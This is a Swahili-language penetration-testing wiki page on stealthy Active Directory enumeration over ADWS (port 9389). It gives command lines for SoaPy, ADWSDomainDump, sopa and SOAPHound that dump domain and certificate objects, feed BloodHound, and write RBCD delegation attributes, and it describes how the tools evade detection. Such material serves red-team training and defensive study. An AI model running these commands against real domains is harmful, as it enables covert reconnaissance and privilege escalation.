# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) imewezeshwa kwa chaguo-msingi kwenye kila Domain Controller tangu Windows Server 2008 R2 na inasikiliza kwenye TCP **9389**. Licha ya jina, **hakuna HTTP inayohusika**. Badala yake huduma inaonyesha data ya mtindo wa LDAP kupitia safu ya itifaki za kufunga za umilikaji za .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa sababu trafiki imefungwa ndani ya binary SOAP frames na inasafiri kwa kupitia port isiyokuwa ya kawaida, **enumeration kupitia ADWS ina uwezekano mdogo wa kuchunguzwa, kuchujwa au kuwekewa signature ikilinganishwa na trafiki ya classic LDAP/389 & 636**. Kwa watendaji hili linamaanisha:

* Ukaguzi wa siri zaidi – Blue teams mara nyingi huzingatia LDAP queries.
* Uhuru wa kukusanya kutoka kwa mahosti zisizo za Windows (Linux, macOS) kwa kutunnel 9389/TCP kupitia SOCKS proxy.
* Data ile ile ungeipata kupitia LDAP (users, groups, ACLs, schema, nk.) na uwezo wa kufanya writes (mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

ADWS interactions zimejengwa juu ya WS-Enumeration: kila query inaanza na ujumbe wa `Enumerate` unaoeleza LDAP filter/attributes na kurudisha GUID ya `EnumerationContext`, ikifuatwa na moja au zaidi ya ujumbe wa `Pull` zinazorusha hadi dirisha la matokeo lililowekwa na server. Contexts zinaisha baada ya takriban dakika ~30, hivyo tooling inahitaji kuorodhesha matokeo kwa ukurasa au kugawanya filters (maswali ya prefix kwa kila CN) ili kuepuka kupoteza state. Unapoomba security descriptors, fafanua control ya `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs, vinginevyo ADWS itabana tu attribute ya `nTSecurityDescriptor` kutoka kwenye SOAP response.

> NOTE: ADWS pia inatumiwa na zana nyingi za RSAT GUI/PowerShell, kwa hivyo trafiki inaweza kuchanganyika na shughuli halali za admin.

## SoaPy – Mteja wa asili wa Python

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezwaji kamili upya wa safu ya itifaki ya ADWS katika Python safi**. Inaunda fremu za NBFX/NBFSE/NNS/NMF byte kwa byte, ikiruhusu ukusanyaji kutoka kwa mifumo inayofanana na Unix bila kugusa runtime ya .NET.

### Vipengele Vikuu

* Inaunga mkono **proxying kupitia SOCKS** (inayofaa kwa C2 implants).
* Vichujio vya utafutaji vilivyo na nyuzi sawa na LDAP `-q '(objectClass=user)'`.
* Operesheni za hiari za **write** ( `--set` / `--delete` ).
* **BOFHound output mode** kwa ajili ya kuingizwa moja kwa moja ndani ya BloodHound.
* Bendera ya `--parse` ya kupendeza timestamps / `userAccountControl` wakati inahitajika kuonekana kwa binadamu.

### Bendera za ukusanyaji zilizolengwa & operesheni za kuandika

SoaPy inakuja na switches zilizochaguliwa ambazo zinajirudia kazi maarufu za LDAP hunting juu ya ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na `--query` / `--filter` zisizo za kuchakatwa kwa pulls za kawaida. Ziunganishe na primitives za kuandika kama `--rbcd <source>` (inaweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging kwa Kerberoasting iliyolengwa) na `--asrep` (kubadilisha `DONT_REQ_PREAUTH` katika `userAccountControl`).

Mfano wa SPN hunt iliyolengwa inayorejesha tu `samAccountName` na `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Tumia host/credentials ile ile ili mara moja ku-weaponise findings: dump RBCD-capable objects kwa `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` ili ku-stage Resource-Based Constrained Delegation chain (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Usanidi (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Tawi la `ldapdomaindump` linalobadilisha maombi ya LDAP kwa wito za ADWS kwenye TCP/9389 ili kupunguza hits za LDAP-signature.
* Inafanya ukaguzi wa awali wa ufikikaji kwa 9389 isipokuwa `--force` itakapopitishwa (inaruka probe ikiwa skana za bandari ni noisy/filtered).
* Imethibitishwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon na bypass iliyofanikiwa kwenye README.

### Ufungaji
```bash
pipx install .
```
### Matumizi
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Matokeo ya kawaida yanarekodi ukaguzi wa ufikikaji wa 9389, ADWS bind, na kuanza/kuisha kwa dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Mteja wa vitendo wa ADWS kwa Golang

Kama ilivyo kwa soapy, [sopa](https://github.com/Macmod/sopa) inatekeleza safu ya itifaki ya ADWS (MS-NNS + MC-NMF + SOAP) katika Golang, ikifunua bendera za mstari wa amri kwa kutoa miito ya ADWS kama:

* **Utafutaji na urejeshi wa object** - `query` / `get`
* **Mzunguko wa maisha wa object** - `create [user|computer|group|ou|container|custom]` na `delete`
* **Uhariri wa sifa** - `attr [add|replace|delete]`
* **Usimamizi wa akaunti** - `set-password` / `change-password`
* na zingine kama `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, n.k.

## SOAPHound – Ukusanyaji mkubwa wa ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni mkusanyaji wa .NET unaohifadhi mwingiliano yote ya LDAP ndani ya ADWS na kutoa JSON inayolingana na BloodHound v4. Inajenga cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha inaitumia tena kwa kupitisha kwa wingi `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (AD-integrated DNS) ili takriban sifa 35 tu muhimu zijitokeze kutoka DC. AutoSplit (`--autosplit --threshold <N>`) hugawanya maswali kwa kiotomatiki kwa prefiksi ya CN ili kubaki chini ya kikomo cha muda cha EnumerationContext cha dakika 30 katika misitu mikubwa.

Mtiririko wa kawaida wa kazi kwenye VM ya operator iliyojiunga na domain:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON zilizotolewa zilichujwa moja kwa moja ndani ya workflows za SharpHound/BloodHound—angalia [BloodHound methodology](bloodhound.md) kwa mawazo ya uchoraji wa grafu wa hatua zinazofuata. AutoSplit inafanya SOAPHound kuwa imara kwenye misitu yenye vitu mamilioni huku ikidumisha idadi ya maswali kuwa chini kuliko snapshots za mtindo wa ADExplorer.

## Mtiririko wa ukusanyaji wa AD wa Stealth

Mtiririko ufuatao unaonyesha jinsi ya kuorodhesha **domain & ADCS objects** kupitia ADWS, kuzibadilisha kuwa BloodHound JSON na kuwinda njia za mashambulizi zinazotegemea cheti — yote kutoka Linux:

1. **Tunnel 9389/TCP** kutoka kwenye mtandao wa lengo hadi mashine yako (kwa mfano kupitia Chisel, Meterpreter, SSH dynamic port-forward, n.k.).  Weka `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Kusanya root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya vitu vinavyohusiana na ADCS kutoka kwa Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Badilisha kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** kwenye BloodHound GUI na endesha cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kuinua ruhusa za vyeti (ESC1, ESC8, etc.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Changanya hii na `s4u2proxy`/`Rubeus /getticket` kwa mnyororo kamili wa **Resource-Based Constrained Delegation** (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Marejeleo

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
